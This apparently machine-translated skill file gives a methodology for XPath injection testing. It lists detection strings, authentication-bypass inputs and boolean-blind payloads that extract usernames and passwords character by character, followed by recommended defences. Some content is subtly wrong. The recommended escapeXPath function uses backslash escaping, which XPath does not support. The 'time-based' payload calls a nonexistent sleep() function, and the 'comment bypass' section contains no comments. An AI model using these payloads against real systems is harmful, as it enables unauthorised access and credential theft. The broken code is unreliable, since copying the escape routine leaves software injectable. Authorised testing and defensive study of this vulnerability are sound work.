---
name: xpath-injection-testing
Description: Professional skills and methodology for XPath injection vulnerability testing
version: 1.0.0
---

# XPath injection vulnerability testing

## Overview

XPath injection is a vulnerability similar to SQL injection. It exploits the structural flaws of XPath query statements, which may lead to information leakage, authentication bypass, etc. This skill provides detection, utilization and protection methods for XPath injection.

## Vulnerability principle

The application directly splices user input into XPath query statements without sufficient validation and filtering, allowing attackers to modify the query logic.

**Dangerous code examples:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath Basics

### Query syntax

**Basic query:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Function

**Commonly used functions:**
- `text()` - Get text content
- `count()` - count
- `substring()` - substring
- `string-length()` - String length
- `contains()` - Contains check

## Test method

### 1. Identify XPath input points

**Common features:**
- User login
- Data search
- XML ​​data query
- Configure query

### 2. Basic detection

**Test special characters:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Test logical operators:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication bypass

**Basic Bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise bypass:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information leakage

**Enumerate users:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Get the number of nodes:**
```
' or count(//user)>0 or '
```

**Get specific node:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Leverage technology

### Authentication bypass

**Method 1: Logic bypass**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: matches all users
```

**Method 2: Annotation Bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: Boolean Blind Injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information leakage

**Enumerate all users:**
```
' or 1=1 or '
Result: Return all user nodes
```

**Get username:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Get each character step by step
```

**Get password:**
```
' or substring(//user[1]/password,1,1)='p' or '
Get password characters step by step
```

### Blind injection technology

**Time-Based Blind Betting:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Boolean based blind injection:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe response differences
```

## Bypass technology

### Encoding bypass

**URL encoding:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML entity encoding:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Comment bypass

**Usage Notes:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function bypass

**Use different functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Tool usage

### XPath expression test

**Online Tools:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Intercept XPath query requests
2. Modify query parameters
3. Observe the response results

### Python script

```python
from lxml import etree
from lxml.etree import XPath

#Load XML document
doc = etree.parse('users.xml')

# Test injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Validation and reporting

### Verification steps

1. Confirm that you can control XPath queries
2. Verification authentication bypass or information leakage
3. Assess the impact (unauthorized access, data leakage, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and input parameters
- XPath query construction method
- Complete exploitation steps and PoC
- Fix suggestions (input validation, parameterized queries, etc.)

## Protective measures

### Recommended plan

1. **Input verification**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized query**
   ```java
   // Using XPath variables
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Whitelist Verification**
   ```java
   // Only specific characters allowed
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Use precompiled queries**
   ```java
   // Predefined query templates
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // Use parameter binding
   ```

5. **Minimum Privileges**
- Limit XPath query scope
- Use access control
- Limit the nodes that can be queried

## Notes

- Only conducted in an authorized testing environment
- Pay attention to the syntax differences between different XPath versions
- Avoid impacting XML data during testing
- Understand the XPath implementation of the target application